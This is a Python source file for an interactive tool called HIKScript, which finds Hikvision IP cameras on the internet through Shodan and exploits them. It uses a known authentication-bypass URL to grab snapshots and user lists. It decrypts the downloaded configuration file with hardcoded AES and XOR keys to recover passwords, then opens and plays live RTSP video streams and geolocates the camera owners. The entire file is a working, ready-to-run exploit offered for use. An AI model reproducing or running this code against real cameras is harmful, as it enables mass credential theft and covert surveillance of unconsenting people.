#!/usr/bin/env python3
"""
HIKScript - Modern HIKVision Camera Scanner and Exploitation Tool
Author: @fracergu
Version: 2.1
Python Version: 3.13+

Features:
- Separated scanning and exploitation workflows
- Modern async requests for performance
- RTSP stream support for HIKVision cameras
- Vulnerability assessment and credential extraction
- Snapshot capture and monitoring
- Threading for concurrent operations
- Enhanced error handling and logging
- IP geolocation and Shodan integration
- Real-time camera information gathering
"""

import asyncio
import aiohttp
import shodan
import requests
import sys
import time
import pathlib
import argparse
import json
import threading
import socket
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
import subprocess
import os
from typing import List, Dict, Optional, Tuple
import logging
import ipinfo

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('hikscript.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# Constants
HIKVISION_SHODAN_QUERY = "App-webs+200+OK"
HIKVISION_MAGIC_AUTH = "?auth=YWRtaW46MTEK"
SNAPSHOT_SUFFIX = "/onvif-http/snapshot"
CONFIG_SUFFIX = "/System/configurationFile"
USERS_SUFFIX = "/Security/users"
RTSP_PORT = 554
HTTP_TIMEOUT = 5
MAX_WORKERS = 50

class HIKScript:
    def __init__(self):
        self.shodan_api_key = ""
        self.session = requests.Session()
        self.session.timeout = HTTP_TIMEOUT
        self.ipinfo_handler = None
        self.rtsp_port = RTSP_PORT  # Global RTSP port setting
        
    def banner(self):
        """Display application banner"""
        print("""
╔══════════════════════════════════════════════════════════════╗
║                     HIKScript                              ║
║              HIKVision Scanner & Exploitation Tool           ║
║                     Version 2.1                              ║
║                    by @fracergu                              ║
╚══════════════════════════════════════════════════════════════╝
        """)

    def setup_ipinfo(self, access_token: str = None):
        """Setup IPInfo handler for geolocation services"""
        if access_token:
            try:
                self.ipinfo_handler = ipinfo.getHandler(access_token)
                logger.info("IPInfo geolocation service initialized")
            except Exception as e:
                logger.warning(f"Failed to initialize IPInfo: {e}")
        else:
            logger.warning("No IPInfo access token provided. Geolocation services disabled.")

    def get_ip_geolocation(self, ip: str) -> Dict:
        """Get geolocation information for an IP address"""
        if not self.ipinfo_handler:
            # Fallback to free service
            try:
                response = requests.get(f'https://geolocation-db.com/jsonp/{ip}', timeout=5)
                result = response.content.decode()
                result = result.split("(")[1].strip(")")
                return json.loads(result)
            except Exception as e:
                logger.error(f"Geolocation lookup failed for {ip}: {e}")
                return {}
        
        try:
            details = self.ipinfo_handler.getDetails(ip)
            return {
                'ip': details.ip,
                'city': details.city,
                'region': details.region,
                'country': details.country,
                'country_name': details.country_name,
                'postal': details.postal,
                'latitude': details.latitude,
                'longitude': details.longitude,
                'org': details.org,
                'timezone': details.timezone,
                'loc': details.loc
            }
        except Exception as e:
            logger.error(f"IPInfo geolocation lookup failed for {ip}: {e}")
            return {}

    def generate_shodan_search_url(self, ip: str) -> str:
        """Generate Shodan search URL for an IP address"""
        return f"https://www.shodan.io/host/{ip}"

    def get_camera_info_extended(self, ip_port: str) -> Dict:
        """Get extended information about a camera"""
        ip = ip_port.split(':')[0]
        port = ip_port.split(':')[1] if ':' in ip_port else '80'
        
        info = {
            'ip_port': ip_port,
            'ip': ip,
            'port': port,
            'timestamp': datetime.now().isoformat(),
            'shodan_url': self.generate_shodan_search_url(ip),
        }
        
        # Get geolocation
        geolocation = self.get_ip_geolocation(ip)
        if geolocation:
            info['geolocation'] = geolocation
            
        # Test vulnerability
        vuln_result = self.check_vulnerability(ip_port)
        info['vulnerable'] = vuln_result.get('vulnerable', False)
        if info['vulnerable']:
            info['snapshot_size'] = vuln_result.get('snapshot_size', 0)
            info['response_time'] = vuln_result.get('response_time', 0)
        
        # Check RTSP port
        rtsp_open = self.check_rtsp_port(ip, self.rtsp_port)
        info['rtsp_port_open'] = rtsp_open
        info['rtsp_port'] = self.rtsp_port
        
        # Try to get server information
        try:
            response = self.session.get(f"http://{ip_port}", timeout=HTTP_TIMEOUT)
            info['http_status'] = response.status_code
            info['server'] = response.headers.get('Server', 'Unknown')
            if 'hikvision' in response.text.lower():
                info['confirmed_hikvision'] = True
        except Exception as e:
            info['http_error'] = str(e)
        
        return info

    def scan_mode(self, api_key: str, city_filter: str = "", country_filter: str = "", 
                  limit: int = 0, output_file: str = None) -> List[str]:
        """
        Scan for HIKVision cameras using Shodan
        """
        logger.info("Starting HIKVision camera scan...")
        self.shodan_api_key = api_key
        
        try:
            api = shodan.Shodan(api_key)
            query = HIKVISION_SHODAN_QUERY
            
            # Apply filters
            if city_filter:
                query += f" +City:{city_filter}"
            if country_filter:
                query += f" +Country:{country_filter}"
                
            logger.info(f"Shodan query: {query}")
            
            ip_list = []
            
            if limit == 0:
                # Get free results (100 max)
                results = api.search(query)
                for result in results['matches']:
                    ip_list.append(f"{result['ip_str']}:{result['port']}")
                    
                logger.info(f"Found {len(ip_list)} potential HIKVision cameras (free results)")
                    
            else:
                # Use search cursor for more results
                counter = 0
                for result in api.search_cursor(query):
                    ip_list.append(f"{result['ip_str']}:{result['port']}")
                    counter += 1
                    if counter >= limit:
                        break
                        
                logger.info(f"Found {len(ip_list)} potential HIKVision cameras")
            
            # Save results
            if not output_file:
                pathlib.Path("targets").mkdir(parents=True, exist_ok=True)
                output_file = f"targets/hikvision_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
            
            with open(output_file, 'w') as f:
                for ip in ip_list:
                    f.write(f"{ip}\n")
            
            logger.info(f"Results saved to: {output_file}")
            return ip_list
            
        except shodan.APIError as e:
            logger.error(f"Shodan API Error: {e}")
            return []
        except Exception as e:
            logger.error(f"Scan error: {e}")
            return []

    def check_vulnerability(self, ip_port: str, save_snapshot: bool = False, timeout: int = HTTP_TIMEOUT, snapshot_mode: str = "exploit") -> Dict:
        """
        Check if a single IP:PORT is vulnerable
        """
        try:
            url = f"http://{ip_port}{SNAPSHOT_SUFFIX}{HIKVISION_MAGIC_AUTH}"
            response = self.session.get(url, timeout=timeout)
            
            if response.status_code == 200 and len(response.content) > 0:
                result = {
                    'ip_port': ip_port,
                    'vulnerable': True,
                    'snapshot_size': len(response.content),
                    'response_time': response.elapsed.total_seconds()
                }
                
                # Save snapshot if requested
                if save_snapshot:
                    self.save_snapshot(ip_port, response, snapshot_mode)
                    
                return result
            else:
                return {'ip_port': ip_port, 'vulnerable': False}
                
        except Exception as e:
            return {'ip_port': ip_port, 'vulnerable': False, 'error': str(e)}

    def save_snapshot(self, ip_port: str, response, mode: str = "exploit"):
        """
        Save snapshot from camera response
        
        Args:
            ip_port: Camera IP:PORT
            response: HTTP response with image data
            mode: "exploit" for organized folders, "check" for flat structure
        """
        try:
            ip_safe = ip_port.replace(':', '_')
            timestamp = round(time.time() * 1000)
            
            if mode == "check":
                # Save all check snapshots in flat structure
                snapshot_dir = pathlib.Path("check_snapshots")
                snapshot_dir.mkdir(parents=True, exist_ok=True)
                filename = snapshot_dir / f"{ip_safe}-{timestamp}.jpg"
            else:
                # Save exploit snapshots in organized folders (default behavior)
                snapshot_dir = pathlib.Path(f"snapshots/{ip_safe}")
                snapshot_dir.mkdir(parents=True, exist_ok=True)
                filename = snapshot_dir / f"{ip_safe}-{timestamp}.jpg"
            
            # Save the image
            with open(filename, 'wb') as f:
                f.write(response.content)
            
            logger.info(f"📸 Snapshot saved: {filename}")
            
        except Exception as e:
            logger.error(f"Failed to save snapshot for {ip_port}: {e}")

    def vulnerability_scan(self, input_file: str, output_file: str = None, 
                          threads: int = MAX_WORKERS, save_snapshot: bool = False, timeout: int = HTTP_TIMEOUT) -> List[str]:
        """
        Scan IPs from file for vulnerabilities
        """
        logger.info(f"Starting vulnerability scan with {threads} threads...")
        
        if save_snapshot:
            logger.info("📸 Snapshot saving enabled - vulnerable cameras will be captured")
        
        # Read IPs from file
        try:
            with open(input_file, 'r') as f:
                ip_list = [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            logger.error(f"Input file not found: {input_file}")
            return []
        
        vulnerable_ips = []
        
        # Use ThreadPoolExecutor for concurrent scanning
        with ThreadPoolExecutor(max_workers=threads) as executor:
            future_to_ip = {executor.submit(self.check_vulnerability, ip, save_snapshot, timeout, "check"): ip 
                           for ip in ip_list}
            
            completed = 0
            for future in as_completed(future_to_ip):
                result = future.result()
                completed += 1
                
                if result.get('vulnerable', False):
                    vulnerable_ips.append(result['ip_port'])
                    logger.info(f"✓ Vulnerable: {result['ip_port']} "
                              f"(Size: {result.get('snapshot_size', 0)} bytes, "
                              f"Time: {result.get('response_time', 0):.2f}s)")
                
                # Progress indicator
                if completed % 10 == 0:
                    print(f"Progress: {completed}/{len(ip_list)} checked", end='\r')
        
        logger.info(f"\nVulnerability scan complete: {len(vulnerable_ips)}/{len(ip_list)} vulnerable")
        
        if save_snapshot and vulnerable_ips:
            logger.info(f"📸 Snapshots saved in 'check_snapshots/' directory")
        
        # Save vulnerable IPs
        if not output_file:
            pathlib.Path("vulnerable").mkdir(parents=True, exist_ok=True)
            output_file = f"vulnerable/vulnerable_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        
        with open(output_file, 'w') as f:
            for ip in vulnerable_ips:
                f.write(f"{ip}\n")
        
        logger.info(f"Vulnerable IPs saved to: {output_file}")
        return vulnerable_ips

    def check_rtsp_port(self, ip: str, port: int = RTSP_PORT, timeout: int = 3) -> bool:
        """
        Check if RTSP port is open
        """
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            result = sock.connect_ex((ip, port))
            sock.close()
            return result == 0
        except Exception:
            return False

    def generate_rtsp_urls(self, ip: str, port: int = None, username: str = "admin", 
                          password: str = "12345") -> List[str]:
        """
        Generate simplified RTSP URLs for HIKVision cameras (channels 101-402 only)
        """
        if not port:
            port = self.rtsp_port
            
        base_ip = ip.split(':')[0]  # Remove HTTP port if present
        
        # Only standard HIKVision channels in order: 101, 102, 201, 202, 301, 302, 401, 402
        rtsp_urls = [
            f"rtsp://{username}:{password}@{base_ip}:{port}/Streaming/Channels/101",  # Channel 1 main
            f"rtsp://{username}:{password}@{base_ip}:{port}/Streaming/Channels/102",  # Channel 1 sub
            f"rtsp://{username}:{password}@{base_ip}:{port}/Streaming/Channels/201",  # Channel 2 main
            f"rtsp://{username}:{password}@{base_ip}:{port}/Streaming/Channels/202",  # Channel 2 sub
            f"rtsp://{username}:{password}@{base_ip}:{port}/Streaming/Channels/301",  # Channel 3 main
            f"rtsp://{username}:{password}@{base_ip}:{port}/Streaming/Channels/302",  # Channel 3 sub
            f"rtsp://{username}:{password}@{base_ip}:{port}/Streaming/Channels/401",  # Channel 4 main
            f"rtsp://{username}:{password}@{base_ip}:{port}/Streaming/Channels/402",  # Channel 4 sub
        ]
        
        return rtsp_urls

    def test_rtsp_stream(self, rtsp_url: str, timeout: int = 10) -> bool:
        """
        Test RTSP stream using ffprobe
        """
        try:
            cmd = [
                'ffprobe', '-v', 'quiet', '-print_format', 'json', 
                '-show_streams', '-rtsp_transport', 'tcp',
                '-i', rtsp_url
            ]
            
            process = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
            return process.returncode == 0
        except Exception:
            return False

    def get_credentials(self, ip_port: str) -> Dict:
        """
        Extract credentials from HIKVision camera
        """
        try:
            # Get users list
            users_url = f"http://{ip_port}{USERS_SUFFIX}{HIKVISION_MAGIC_AUTH}"
            users_response = self.session.get(users_url, timeout=HTTP_TIMEOUT)
            
            users = []
            if users_response.status_code == 200 and "<UserList" in users_response.text:
                # Parse XML to extract usernames
                import xml.etree.ElementTree as ET
                root = ET.fromstring(users_response.text)
                namespace = root.tag.split('}')[0].strip('{')
                for user in root.findall(f"{{{namespace}}}User"):
                    username_elem = user.find(f"{{{namespace}}}userName")
                    if username_elem is not None:
                        users.append(username_elem.text)
            
            if not users:
                return {'ip_port': ip_port, 'users': [], 'credentials': {}, 'error': 'No users found'}
            
            # Get configuration file
            config_url = f"http://{ip_port}{CONFIG_SUFFIX}{HIKVISION_MAGIC_AUTH}"
            config_response = self.session.get(config_url, timeout=HTTP_TIMEOUT)
            
            if config_response.status_code != 200:
                return {'ip_port': ip_port, 'users': users, 'credentials': {}, 
                       'error': 'Cannot access config file'}
            
            # Decrypt configuration
            credentials = self._extract_credentials(config_response.content, users)
            
            return {
                'ip_port': ip_port,
                'users': users,
                'credentials': credentials,
                'success': True
            }
            
        except Exception as e:
            return {'ip_port': ip_port, 'error': str(e)}

    def _extract_credentials(self, config_data: bytes, users: List[str]) -> Dict[str, List[str]]:
        """
        Extract credentials from encrypted config data
        """
        try:
            # Decrypt with OpenSSL
            from subprocess import Popen, PIPE
            
            cmd = [
                "openssl", "enc", "-d", "-aes-128-ecb",
                "-K", "279977f62f6cfd2d91cd75b889ce0c9a",
                "-nosalt", "-md", "md5"
            ]
            
            process = Popen(cmd, stdin=PIPE, stdout=PIPE, stderr=PIPE)
            decrypted_data, _ = process.communicate(input=config_data)
            
            # XOR with key
            key = bytes([0x73, 0x8B, 0x55, 0x44])
            xor_output = bytearray()
            for i in range(len(decrypted_data)):
                xor_output.append(decrypted_data[i] ^ key[i % len(key)])
            
            # Extract passwords for each user
            user_credentials = {}
            for user in users:
                keyword = user.encode()
                start_idx = 0
                passwords = []
                
                while True:
                    start_idx = xor_output.find(keyword, start_idx)
                    if start_idx == -1:
                        break
                    
                    start_idx += len(keyword)
                    # Skip null bytes
                    while start_idx < len(xor_output) and xor_output[start_idx] == 0x00:
                        start_idx += 1
                    
                    pass_start = start_idx
                    # Find end of password
                    while start_idx < len(xor_output) and xor_output[start_idx] != 0x00:
                        start_idx += 1
                    
                    pass_end = start_idx
                    password = xor_output[pass_start:pass_end].decode(errors='ignore')
                    
                    if password and password not in passwords:
                        passwords.append(password)
                    
                    start_idx = pass_end
                
                if passwords:
                    user_credentials[user] = passwords
            
            # Clean up admin passwords (remove default ones)
            if 'admin' in user_credentials and len(user_credentials['admin']) > 1:
                user_credentials['admin'] = [pwd for pwd in user_credentials['admin'] 
                                           if pwd not in ['12345', 'admin']]
            
            return user_credentials
            
        except Exception as e:
            logger.error(f"Credential extraction error: {e}")
            return {}

    def capture_snapshots(self, ip_port: str, interval: int = 5, count: int = 10):
        """
        Capture snapshots from camera
        """
        logger.info(f"Capturing {count} snapshots from {ip_port} every {interval} seconds...")
        
        # Create directory
        ip_safe = ip_port.replace(':', '_')
        snapshot_dir = pathlib.Path(f"snapshots/{ip_safe}")
        snapshot_dir.mkdir(parents=True, exist_ok=True)
        
        captured = 0
        while captured < count:
            try:
                url = f"http://{ip_port}{SNAPSHOT_SUFFIX}{HIKVISION_MAGIC_AUTH}"
                response = self.session.get(url, timeout=HTTP_TIMEOUT)
                
                if response.status_code == 200 and len(response.content) > 0:
                    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                    filename = snapshot_dir / f"snapshot_{timestamp}.jpg"
                    
                    with open(filename, 'wb') as f:
                        f.write(response.content)
                    
                    logger.info(f"Snapshot saved: {filename}")
                    captured += 1
                else:
                    logger.warning(f"Failed to capture snapshot from {ip_port}")
                
                if captured < count:
                    time.sleep(interval)
                    
            except KeyboardInterrupt:
                logger.info("Snapshot capture interrupted by user")
                break
            except Exception as e:
                logger.error(f"Snapshot capture error: {e}")
                break

    def exploitation_menu(self, ip_port: str):
        """
        Interactive exploitation menu for a specific camera
        """
        self.banner()
        print(f"\n🎯 Target: {ip_port}")
        print("=" * 60)
        
        # Get extended info first
        camera_info = self.get_camera_info_extended(ip_port)
        self._display_camera_info(camera_info)
        
        while True:
            print("\n📋 Exploitation Options:")
            print("1. Extract credentials")
            print("2. Capture snapshots")
            print("3. Test RTSP streams")
            print("4. Check/Change RTSP port")
            print("5. Auto RTSP discover")
            print("6. Show camera info")
            print("7. Refresh camera info")
            print("8. Open Shodan page")
            print("0. Exit")
            
            try:
                choice = input("\n🔍 Select option: ").strip()
                
                if choice == '0':
                    break
                elif choice == '1':
                    self._handle_credentials(ip_port)
                elif choice == '2':
                    self._handle_snapshots(ip_port)
                elif choice == '3':
                    self._handle_rtsp_test(ip_port)
                elif choice == '4':
                    self._handle_rtsp_port_check(ip_port)
                elif choice == '5':
                    self._handle_auto_rtsp_discover(ip_port)
                elif choice == '6':
                    self._display_camera_info(camera_info)
                elif choice == '7':
                    camera_info = self.get_camera_info_extended(ip_port)
                    self._display_camera_info(camera_info)
                elif choice == '8':
                    self._handle_shodan_page(ip_port)
                else:
                    print("❌ Invalid option")
                    
            except KeyboardInterrupt:
                print("\n👋 Goodbye!")
                break

    def _display_camera_info(self, camera_info: Dict):
        """Display formatted camera information"""
        print(f"\n📊 Camera Information:")
        print("-" * 60)
        print(f"📍 IP:Port: {camera_info.get('ip_port', 'Unknown')}")
        print(f"🌍 Shodan URL: {camera_info.get('shodan_url', 'N/A')}")
        
        if 'geolocation' in camera_info:
            geo = camera_info['geolocation']
            print(f"🗺️  Location: {geo.get('city', 'Unknown')}, {geo.get('country_name', geo.get('country', 'Unknown'))}")
            if geo.get('loc'):
                print(f"📍 Coordinates: {geo.get('loc')}")
            print(f"🏢 Organization: {geo.get('org', 'Unknown')}")
            if geo.get('timezone'):
                print(f"🕐 Timezone: {geo.get('timezone')}")
        
        print(f"🔓 Vulnerable: {'✅ Yes' if camera_info.get('vulnerable', False) else '❌ No'}")
        
        if camera_info.get('vulnerable', False):
            print(f"📸 Snapshot Size: {camera_info.get('snapshot_size', 0)} bytes")
            print(f"⏱️  Response Time: {camera_info.get('response_time', 0):.2f}s")
        
        print(f"📺 RTSP Port {camera_info.get('rtsp_port', RTSP_PORT)}: {'✅ Open' if camera_info.get('rtsp_port_open', False) else '❌ Closed'}")
        print(f"🌐 HTTP Status: {camera_info.get('http_status', 'Unknown')}")
        print(f"🖥️  Server: {camera_info.get('server', 'Unknown')}")
        
        if camera_info.get('confirmed_hikvision'):
            print("✅ Confirmed HIKVision Device")

    def _handle_credentials(self, ip_port: str):
        """Handle credential extraction"""
        print(f"\n🔑 Extracting credentials from {ip_port}...")
        result = self.get_credentials(ip_port)
        
        if result.get('success'):
            print(f"✅ Found users: {', '.join(result['users'])}")
            
            for user, passwords in result['credentials'].items():
                for password in passwords:
                    print(f"📝 {ip_port:<25} {user}:{password}")
        else:
            print(f"❌ Failed: {result.get('error', 'Unknown error')}")

    def _handle_snapshots(self, ip_port: str):
        """Handle snapshot capture"""
        try:
            interval = int(input("📸 Snapshot interval (seconds) [5]: ") or "5")
            count = int(input("🔢 Number of snapshots [10]: ") or "10")
            
            self.capture_snapshots(ip_port, interval, count)
        except ValueError:
            print("❌ Invalid input")

    def _handle_rtsp_test(self, ip_port: str):
        """Handle RTSP stream testing"""
        username = input("👤 Username [admin]: ") or "admin"
        password = input("🔒 Password [12345]: ") or "12345"
        
        urls = self.generate_rtsp_urls(ip_port, username=username, password=password)
        print(f"\n🧪 Testing RTSP streams...")
        
        working_urls = []
        for i, url in enumerate(urls, 1):
            print(f"Testing ({i}/{len(urls)}): {url}")
            if self.test_rtsp_stream(url):
                print(f"✅ Working: {url}")
                working_urls.append(url)
            else:
                print(f"❌ Failed: {url}")
        
        if working_urls:
            print(f"\n🎉 Found {len(working_urls)} working RTSP streams!")
        else:
            print("\n😞 No working RTSP streams found")

    def _handle_rtsp_port_check(self, ip_port: str):
        """Handle RTSP port check and change"""
        ip = ip_port.split(':')[0]
        
        print(f"\n🔌 Current RTSP port: {self.rtsp_port}")
        print("1. Test current RTSP port")
        print("2. Change RTSP port")
        print("3. Test custom port (one-time)")
        
        try:
            choice = input("\n🎯 Select option [1]: ").strip() or "1"
            
            if choice == "1":
                # Test current port
                if self.check_rtsp_port(ip, self.rtsp_port):
                    print(f"✅ RTSP port {self.rtsp_port} is open on {ip}")
                else:
                    print(f"❌ RTSP port {self.rtsp_port} is closed on {ip}")
                    
            elif choice == "2":
                # Change global RTSP port
                new_port = int(input(f"🔌 New RTSP Port [{self.rtsp_port}]: ") or str(self.rtsp_port))
                old_port = self.rtsp_port
                self.rtsp_port = new_port
                
                print(f"🔄 RTSP port changed: {old_port} → {new_port}")
                
                # Test the new port
                if self.check_rtsp_port(ip, self.rtsp_port):
                    print(f"✅ RTSP port {self.rtsp_port} is open on {ip}")
                else:
                    print(f"❌ RTSP port {self.rtsp_port} is closed on {ip}")
                    
            elif choice == "3":
                # Test custom port without changing global setting
                test_port = int(input(f"🔌 Test RTSP Port [{self.rtsp_port}]: ") or str(self.rtsp_port))
                
                if self.check_rtsp_port(ip, test_port):
                    print(f"✅ RTSP port {test_port} is open on {ip}")
                    
                    if test_port != self.rtsp_port:
                        change = input(f"🔄 Set {test_port} as global RTSP port? [y/N]: ").lower()
                        if change in ['y', 'yes']:
                            old_port = self.rtsp_port
                            self.rtsp_port = test_port
                            print(f"✅ RTSP port changed: {old_port} → {test_port}")
                else:
                    print(f"❌ RTSP port {test_port} is closed on {ip}")
                    
            else:
                print("❌ Invalid option")
                
        except ValueError:
            print("❌ Invalid port number")
        except KeyboardInterrupt:
            print("\n⏭️ Cancelled")

    def _handle_auto_rtsp_discover(self, ip_port: str):
        """Handle automatic RTSP discovery using extracted credentials"""
        print(f"\n🔍 Auto RTSP Discovery for {ip_port}")
        print("=" * 50)
        
        # Step 1: Extract credentials
        print("📊 Step 1: Extracting credentials...")
        cred_result = self.get_credentials(ip_port)
        
        if not cred_result.get('success'):
            print(f"❌ Failed to extract credentials: {cred_result.get('error', 'Unknown error')}")
            
            # Fallback to manual input
            print("\n🔄 Fallback: Manual credential input")
            username = input("👤 Username [admin]: ") or "admin"
            password = input("🔒 Password [12345]: ") or "12345"
            credentials = {username: [password]}
        else:
            credentials = cred_result['credentials']
            print(f"✅ Found credentials for users: {', '.join(cred_result['users'])}")
            
            # Only use extracted credentials, no fallback to defaults
            if not credentials:
                print("⚠️ No passwords found in extracted credentials, using defaults")
                credentials = {'admin': ['12345']}
        
        # Step 2: Test RTSP streams sequentially (stop on first failure)
        print(f"\n📡 Step 2: Testing RTSP streams...")
        working_streams = []
        
        print(f"🧪 Testing RTSP channels sequentially (101→102→201→202→301→302→401→402)")
        print("📍 Will stop on first failed channel for each credential set")
        
        for username, passwords in credentials.items():
            for password in passwords:
                print(f"\n🔑 Testing: {username}:{password}")
                urls = self.generate_rtsp_urls(ip_port, username=username, password=password)
                
                # Test sequentially and stop on first failure
                for i, url in enumerate(urls):
                    channel = url.split('/')[-1]  # Extract channel number (e.g., "101")
                    print(f"   Channel {channel}... ", end='')
                    
                    if self.test_rtsp_stream(url):
                        print("✅")
                        working_streams.append({
                            'url': url,
                            'username': username,
                            'password': password,
                            'stream_path': channel
                        })
                    else:
                        print("❌")
                        # Stop testing further channels for this credential set
                        if i < len(urls) - 1:
                            print(f"   🛑 Stopping search for {username}:{password} (remaining channels likely unavailable)")
                        break
        
        # Step 3: Display results and offer playback
        if not working_streams:
            print("\n😞 No working RTSP streams found")
            return
        
        print(f"\n🎉 Found {len(working_streams)} working RTSP streams!")
        print("=" * 50)
        
        for i, stream in enumerate(working_streams, 1):
            print(f"{i}. {stream['username']}:{stream['password']} - {stream['stream_path']}")
        
        # Step 4: Offer ffplay playback
        if self._check_ffplay_available():
            print(f"\n🎬 ffplay is available! Select stream to play:")
            print("0. Skip playback")
            
            try:
                choice = input("\n🎯 Select stream number: ").strip()
                
                if choice != '0' and choice.isdigit():
                    stream_idx = int(choice) - 1
                    if 0 <= stream_idx < len(working_streams):
                        selected_stream = working_streams[stream_idx]
                        self._play_rtsp_stream(selected_stream['url'])
                    else:
                        print("❌ Invalid stream number")
                        
            except (ValueError, KeyboardInterrupt):
                print("\n⏭️ Skipping playback")
        else:
            print(f"\n💡 Install ffplay to test streams: sudo apt install ffmpeg")
            print("📋 Working RTSP URLs:")
            for stream in working_streams:
                print(f"   {stream['url']}")

    def _check_ffplay_available(self) -> bool:
        """Check if ffplay is available in the system"""
        try:
            subprocess.run(['ffplay', '-version'], capture_output=True, timeout=3)
            return True
        except (subprocess.TimeoutExpired, FileNotFoundError, subprocess.CalledProcessError):
            return False

    def _play_rtsp_stream(self, rtsp_url: str):
        """Play RTSP stream using ffplay"""
        print(f"\n🎬 Playing RTSP stream...")
        print(f"📺 URL: {rtsp_url}")
        print("💡 Press 'q' to quit ffplay")
        print("💡 Press Ctrl+C here to return to menu")
        
        try:
            # Use ffplay with optimized settings for RTSP
            cmd = [
                'ffplay',
                '-rtsp_transport', 'tcp',  # Use TCP for better reliability
                '-fflags', '+discardcorrupt',  # Discard corrupt packets
                '-flags', 'low_delay',  # Low latency
                '-framedrop',  # Drop frames if needed
                '-loglevel', 'quiet',  # Reduce ffplay output
                rtsp_url
            ]
            
            process = subprocess.Popen(cmd)
            process.wait()
            
        except KeyboardInterrupt:
            print("\n⏹️ Stopping playback...")
            try:
                process.terminate()
                process.wait(timeout=3)
            except:
                process.kill()
        except Exception as e:
            print(f"❌ Playback error: {e}")

    def _handle_shodan_page(self, ip_port: str):
        """Handle opening Shodan page"""
        ip = ip_port.split(':')[0]
        shodan_url = self.generate_shodan_search_url(ip)
        print(f"\n🔍 Shodan URL: {shodan_url}")
        
        try:
            import webbrowser
            webbrowser.open(shodan_url)
            print("✅ Opened in browser")
        except Exception as e:
            print(f"❌ Failed to open browser: {e}")
            print("Please copy the URL manually")

def main():
    parser = argparse.ArgumentParser(description="HIKScript - HIKVision Scanner & Exploitation Tool")
    subparsers = parser.add_subparsers(dest='mode', help='Operation mode')
    
    # Scan mode
    scan_parser = subparsers.add_parser('scan', help='Scan for HIKVision cameras')
    scan_parser.add_argument('--api-key', required=True, help='Shodan API key')
    scan_parser.add_argument('--city', help='Filter by city')
    scan_parser.add_argument('--country', help='Filter by country code')
    scan_parser.add_argument('--limit', type=int, default=0, help='Limit results (0 for free 100)')
    scan_parser.add_argument('--output', help='Output file')
    
    # Vulnerability check mode
    vuln_parser = subparsers.add_parser('check', help='Check vulnerabilities from IP list')
    vuln_parser.add_argument('--input', required=True, help='Input file with IPs')
    vuln_parser.add_argument('--output', help='Output file for vulnerable IPs')
    vuln_parser.add_argument('--threads', type=int, default=MAX_WORKERS, help='Number of threads')
    vuln_parser.add_argument('--timeout', type=int, default=HTTP_TIMEOUT, help='HTTP timeout in seconds (default: 5)')
    vuln_parser.add_argument('--save-snapshot', action='store_true', help='Save snapshot for vulnerable cameras')
    
    # Exploitation mode
    exploit_parser = subparsers.add_parser('exploit', help='Exploit specific camera')
    exploit_parser.add_argument('target', help='Target IP:PORT')
    exploit_parser.add_argument('--ipinfo-token', help='IPInfo API token for geolocation')
    
    args = parser.parse_args()
    
    if not args.mode:
        parser.print_help()
        return
    
    tool = HIKScript()
    
    if args.mode == 'scan':
        tool.banner()
        tool.scan_mode(args.api_key, args.city or "", args.country or "", 
                      args.limit, args.output)
    
    elif args.mode == 'check':
        tool.banner()
        tool.vulnerability_scan(args.input, args.output, args.threads, getattr(args, 'save_snapshot', False), args.timeout)
    
    elif args.mode == 'exploit':
        if hasattr(args, 'ipinfo_token') and args.ipinfo_token:
            tool.setup_ipinfo(args.ipinfo_token)
        tool.exploitation_menu(args.target)

if __name__ == "__main__":
    main() 